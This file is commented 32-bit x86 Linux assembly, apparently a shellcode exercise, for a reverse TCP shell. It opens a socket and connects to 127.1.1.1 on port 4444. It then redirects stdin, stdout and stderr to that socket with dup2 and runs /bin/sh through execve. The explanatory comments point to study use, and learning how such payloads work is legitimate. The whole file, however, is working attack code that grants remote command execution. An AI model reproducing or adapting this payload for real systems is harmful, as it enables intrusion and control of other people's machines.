global _start

section .text

_start:
        ; xor register eax so we avoid null byte, then mov value into other registers as well   
    xor eax, eax
    mov ebx, eax
    mov ecx, eax
    mov edi, eax
    mov esi, eax

socket:
    ; ====================================================================================================
    ; Create file descriptor for socket communication - http://man7.org/linux/man-pages/man2/socket.2.html
    ; ====================================================================================================
    ; socketcall syscall () - 0x66 - $ find /usr/include -name "unistd_32.h" |  cat $(head -n 1) | grep "socketcall"
    ; sys_socketcall	0x66	int call	unsigned long __user *args https://syscalls.kernelgrok.com/
    ; http://man7.org/linux/man-pages/man2/socketcall.2.html

    mov al, 0x66 ; 102 sys_socketcall

    ; #define SYS_SOCKET 1  - $ find /usr/include -name "net.h" |  cat $(head -n 2) | grep "SOCKET"
    inc bl ; SYS_SOCKET 1 

    ; create socket - int socket(int domain, int type, int protocol); - http://man7.org/linux/man-pages/man2/socket.2.html
    ; domain - protocol family IPv4 -> PF_INET - 0x2  $ find /usr/include -name "socket.h" |  cat $(head -n 1) | grep "_INET"
    ; type - tcp -> SOCK_STREAM - 0x1 - $ find /usr/include -name "socket_type.h" |  cat $(head -n 1) | grep "SOCK_STREAM"
    ; protocol - 0x0 means any protocol 
    ; Push arguments on the stack for SYS_SOCKET
    
    push ecx ; 0x0 - any - int protocol
    push ebx ; 0x1 - SOCK_STREAM - int type
    push byte 0x2 ; 0x2 - PF_INET/AF_INET - int domain
    
    mov ecx, esp ; store argument address in ecx

    int 0x80 ; sys_socketcall

connect:
    ; ===============================================================
    ; Connect to remote address - https://linux.die.net/man/2/connect
    ; ===============================================================
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; #define SYS_CONNECT        3               /* - $ find /usr/include -name "net.h" |  cat $(head -n 2) | grep "CONNECT"

    mov esi, eax ; move sockfd into esi
    mov al, 0x66; 102 sys_socketcall
    mov bl, 0x3; SYS_CONNECT 

    ; 127.0.0.0/8 is loopback, so using 127.1.1.1 means that we don't have to deal with nulls
    push 0x0101017f; 127.1.1.1 in network byte order 
    push word 0x5c11; port 4444 in network byte order
    push word 0x2 ; 0x2, sin_family - AF_INET- bx same value as SYS_BIND

    mov ecx, esp ; store sockaddr_in pointer
    push byte 16 ; socketlen_t addrlen 16 bit

    push ecx ; sockaddr_in pointer
    push esi ; push sockfd

    mov ecx, esp ; store argument address in ecx
    int 0x80 ; syscall

duplicate:
    ; ============================================================
    ; Duplicate file descriptor - https://linux.die.net/man/2/dup2
    ; ============================================================
    ; redirect socket to stdin, stdout, stderr with dup2
    ; 63 = - int dup2(int oldfd=ebx, int newfd=ecx); 
    ; $ find /usr/include -name "unistd_32.h" | cat $(head -n 1) | grep "dup2"
    ; #define __NR_dup2 63
    xor ecx, ecx ; zero out ecx for counter

    ; Looping to set up
dup2:
    mov al, 0x3f ; int dup2 - 63 in hex
    int 0x80 ; dup2 syscall
    inc cl ; increment loop register
    cmp ecx, 0x3 ; compare ecx 0x3 
    jne dup2 ; if ecx != 4 continue looping

execsh:
    ; =============================================================
    ; Execute /bin/sh - execve
    ; =============================================================

    ; Push //bin/sh0x00 onto the stack
    ; null byte
    xor eax, eax ; null out eax
    push eax ; null byte
    
    ; //bin/sh
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    
    mov ebx, esp ; move stack pointer into ebx
    push eax ; push another null for the sys argv
    mov edx, esp ; sysargv arguments - address as above, but now with extra null bytes
    push ebx ; push address of the program name -> //bin/sh0x00
    mov ecx, esp ; arguments

    mov al, 11 ; execve syscall
    int 0x80 ; call execve
